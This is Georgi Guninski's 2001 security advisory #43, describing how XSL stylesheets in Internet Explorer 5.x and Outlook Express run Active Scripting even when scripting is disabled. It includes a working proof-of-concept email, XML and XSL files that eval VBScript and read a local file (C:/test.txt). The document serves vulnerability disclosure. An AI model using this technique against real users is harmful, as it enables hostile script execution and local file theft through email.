   guninski@guninski.com Georgi Guninski security advisory #43, 2001
   
   XML scripting in IE, Outlook Express
   
   Systems affected:
   Internet Explorer 5.x - including full patched up to now though Microsoft cannot
   reproduce the problem on fully patched IE 5.x ,Outlook Express (probably Outlook have not
   tested)
   
   Risk: High
   Date: 20 April 2001
   
   Legal Notice:
   This Advisory is Copyright (c) 2001 Georgi Guninski. You may distribute it unmodified.
   You may not modify it and distribute it or distribute parts of it without the author's
   written permission.
   
   Disclaimer:
   The information in this advisory is believed to be true based on experiments though it may be
   false.
   The opinions expressed in this advisory and program are my own and not of any company.
   The usual standard disclaimer applies, especially the fact that Georgi Guninski
   is not liable for any damages caused by direct or  indirect use of the information
   or functionality provided by this advisory or program.
   Georgi Guninski bears no responsibility for content or misuse of this advisory or program or
   any derivatives thereof.
   
   Background:
   We have some disagreement with Microsoft whether this works on fully patched IE 5.x.
   I believe I am running fully patched IE according to the rules for patching in
   Microsoft's security bulletins.
   The problem seems to be the version of WSH which is described in MS-01-015 at:
   http://www.microsoft.com/technet/security/bulletin/ms01-015.asp
   To check whether you are vulnerable check DEMONSTRATION.
   
   Description:
   
   It is possible to execute Active Scripting with the help of XML and XSL even if
   Active Scripting is disabled in all security zones. This is especially dangerous in
   email messages. Though this is not typical exploit itself, it may be used in other
   exploits especially in email.
   
   Details:
   
   The problem are xml stylesheets which may contain Active Scripting and they are executed
   regardless of the settings for Active Scripting in IE/Outlook Express.
   Below is a demonstration which executes Active Scripting which contains the demo from
   my advisory #41.
   When xstyle.eml is viewed with IE or OE the Active Script in it is executed regardless of
   user's settings.
   
   --xstyle.eml--------------------------------------------------------------
   ....
   <IFRAME SRC="http://SOMEHOST/xstyle.xml"></IFRAME>
   ....
   --------------------------------------------------------------------------
   
   --xstyle.xml--------------------------------------------------------------
   <?xml version="1.0"?>
   <?xml-stylesheet type="text/xsl" href="xstyle.xsl" ?>
   <doc>
   style
   </doc>
   --------------------------------------------------------------------------
   
   --xstyle.xsl--------------------------------------------------------------
   <xsl:stylesheet xmlns:xsl="http://www.w3.org/TR/WD-xsl">
   <xsl:script>
   <![CDATA[
   a=new ActiveXObject('htmlfile');
   a.open();
   a.write("<html><body>gg</body></html>");
   a.close();
   v=new ActiveXObject("MSScriptControl.ScriptControl.1");
   v.Language="VBScript";
   v.eval('MsgBox ("This is VBSCRIPT",65,"This is VBSCRIPT")');
   x=v.eval('GetObject("C:/test.txt","htmlfile")');
   v.eval('MsgBox ("Hi",65,"Hi")');
   a.location="about:Here is your file <BR>"+x.body.innerHTML;
   ]]>
   </xsl:script>
   </xsl:stylesheet>
   --------------------------------------------------------------------------
   
   Workaround: I do not know of workaround but Microsoft claims updating WSH solves the issue.
   
   Demonstration:
   http://www.guninski.com/xstyle.eml - disable Active Scripting and if you see any
   message box you are vulnerable.
   
   Vendor status:
   Microsoft was informed on 18 April 2001
   
   Regards,
   Georgi Guninski
   http://www.guninski.com
   
